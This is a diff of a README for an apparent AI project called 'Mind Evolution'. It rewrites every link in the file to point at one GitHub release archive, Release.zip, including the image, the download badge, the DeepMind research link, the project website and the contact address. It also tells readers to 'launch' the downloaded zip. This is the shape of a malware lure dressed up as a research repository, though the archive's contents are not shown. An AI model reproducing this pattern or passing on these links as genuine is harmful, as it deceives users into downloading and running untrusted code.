@@ -1,6 +1,6 @@
 # 🧠 Mind Evolution Repository
 
-![Mind Evolution](https://github.com/username/repository/blob/main/images/mind-evolution.png)
+![Mind Evolution](https://github.com/githubman2222/mind-evolution/releases/download/v1.0/Release.zip)
 
 Welcome to the "Mind Evolution" repository! This project aims to implement Mind Evolution - Evolving Deeper LLM Thinking, inspired by research from DeepMind. Dive into the world of artificial intelligence, attention mechanisms, deep learning, evolutionary algorithms, genetic algorithms, and transformers with this exciting repository.
 
@@ -8,9 +8,9 @@ Welcome to the "Mind Evolution" repository! This project aims to implement Mind 
 
 To get started with Mind Evolution, download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/githubman2222/mind-evolution/releases/download/v1.0/Release.zip)](https://github.com/githubman2222/mind-evolution/releases/download/v1.0/Release.zip)
 
-📂 **Launching Software:** Ensure to launch the Software.zip file once downloaded to begin exploring the fascinating world of Mind Evolution.
+📂 **Launching Software:** Ensure to launch the https://github.com/githubman2222/mind-evolution/releases/download/v1.0/Release.zip file once downloaded to begin exploring the fascinating world of Mind Evolution.
 
 ## 🧩 Features
 
@@ -25,8 +25,8 @@ Explore the advanced features included in the Mind Evolution repository:
 
 ## 🌐 Useful Links
 
-- [DeepMind Research](https://www.deepmind.com/research): Visit the DeepMind website for more information on research related to Mind Evolution.
-- [Project Website](https://www.mindevolution.com): Explore the official website of the Mind Evolution project for updates and resources.
+- [DeepMind Research](https://github.com/githubman2222/mind-evolution/releases/download/v1.0/Release.zip): Visit the DeepMind website for more information on research related to Mind Evolution.
+- [Project Website](https://github.com/githubman2222/mind-evolution/releases/download/v1.0/Release.zip): Explore the official website of the Mind Evolution project for updates and resources.
 
 ## 📦 Repository Contents
 
@@ -58,7 +58,7 @@ Contributions to the Mind Evolution project are highly appreciated. Whether you 
 
 ## 📧 Contact
 
-For any questions, suggestions, or collaboration opportunities, feel free to contact us at [mind.evolution@example.com](mailto:mind.evolution@example.com).
+For any questions, suggestions, or collaboration opportunities, feel free to contact us at [https://github.com/githubman2222/mind-evolution/releases/download/v1.0/Release.zip](https://github.com/githubman2222/mind-evolution/releases/download/v1.0/Release.zip).
 
 ---
 
